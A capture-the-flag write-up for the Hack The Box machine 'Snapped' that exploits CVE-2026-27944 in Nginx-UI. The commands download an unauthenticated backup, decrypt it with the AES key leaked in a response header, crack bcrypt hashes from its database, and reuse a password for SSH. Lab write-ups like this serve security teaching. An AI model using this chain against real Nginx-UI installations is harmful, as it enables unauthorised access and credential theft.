# HTB — Snapped (Hard) — User Flag Writeup

**Machine:** Snapped
**Difficulty:** Hard
**Flag obtained:** `user.txt`
**Vulnerability exploited:** CVE-2026-27944 — Unauthenticated Nginx-UI Backup Exfiltration

---

## 1. Reconnaissance

### Nmap scan

```bash
nmap -sCV 10.129.242.192
```

Results:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |

The HTTP service redirects to `http://snapped.htb/`, so the domain is added to `/etc/hosts`:

```bash
echo "10.129.242.192 snapped.htb" | sudo tee -a /etc/hosts
```

### Subdomain enumeration

The main site is a generic company landing page with nothing of immediate interest, so subdomains are fuzzed:

```bash
ffuf -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt \
     -u http://FUZZ.snapped.htb -ic
```

This reveals an `admin` subdomain, added to `/etc/hosts` as well. Visiting it shows the default login page for **Nginx-UI**, a web-based Nginx management panel.

---

## 2. Foothold — CVE-2026-27944

### Discovering the vulnerable endpoint

With no default credentials working, the `/api/*` namespace is fuzzed:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
     -u http://admin.snapped.htb/api/FUZZ -ic
```

Most endpoints return `403`, but `/api/backup` responds `200` and returns a downloadable ZIP file. Inspecting the response headers shows an interesting `X-Backup-Security` value alongside the file.

This matches **CVE-2026-27944**, affecting Nginx-UI ≤ 2.3.2: the `/api/backup` endpoint can be reached **without authentication**, and the response header leaks the AES key/IV needed to decrypt the backup contents.

### Downloading the backup

```bash
curl -OJ -v http://admin.snapped.htb/api/backup
```

The response includes:

```
X-Backup-Security: <base64-key>:<base64-iv>
```

### Deriving the decryption key/IV

```bash
key=$(echo '<base64-key>' | base64 -d | xxd -p -c 256)
iv=$(echo '<base64-iv>'  | base64 -d | xxd -p)
```

### Unpacking the backup

```bash
unzip -d backup backup-<timestamp>.zip
cd backup
```

This produces `nginx-ui.zip` (encrypted) and `nginx.zip`, plus a `hash_info.txt`.

### Decrypting the Nginx-UI archive

```bash
openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginxui_decrypted.zip -K $key -iv $iv
unzip nginxui_decrypted.zip
```

This yields `app.ini` and `database.db` — the Nginx-UI SQLite database.

---

## 3. Extracting credentials

### Inspecting the database

```bash
sqlite3 database.db
sqlite> .tables
sqlite> select * from users;
```

Two bcrypt password hashes are found — one for `admin`, one for `jonathan`.

### Cracking the hash

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

The `jonathan` hash cracks successfully, yielding a plaintext password.

---

## 4. Gaining SSH access

The cracked Nginx-UI credentials are tried against SSH, on the assumption of password reuse:

```bash
ssh jonathan@snapped.htb
```

Login succeeds, granting an initial shell as `jonathan`.

```bash
jonathan@snapped:~$ cat user.txt
```

**User flag obtained.** 🚩

---

## Summary of the Attack Chain

1. Enumerate subdomains → find `admin.snapped.htb` running Nginx-UI.
2. Fuzz `/api/*` → discover unauthenticated `/api/backup` (CVE-2026-27944).
3. Extract AES key/IV from the `X-Backup-Security` response header.
4. Decrypt the backup to recover the Nginx-UI SQLite database.
5. Crack a leaked bcrypt hash with `hashcat` + `rockyou.txt`.
6. Reuse the cracked credentials over SSH to land a foothold as `jonathan`.

---

## Tools Used

- `nmap` — port/service enumeration
- `ffuf` — subdomain and endpoint fuzzing
- `curl` — interacting with the vulnerable API endpoint
- `xxd` / `base64` — decoding the leaked key/IV
- `openssl` — decrypting the backup archive
- `sqlite3` — inspecting the Nginx-UI database
- `hashcat` — cracking the bcrypt password hash
- `ssh` — remote login for foothold

---

## Lessons Learned

- Backup/export endpoints are a common source of unauthenticated data disclosure — always fuzz for them separately from the main application routes.
- Leaking encryption material (key/IV) in response headers defeats the purpose of encrypting the backup at rest.
- Password reuse between web application accounts and system accounts (SSH) remains a reliable escalation path once one credential set is cracked.
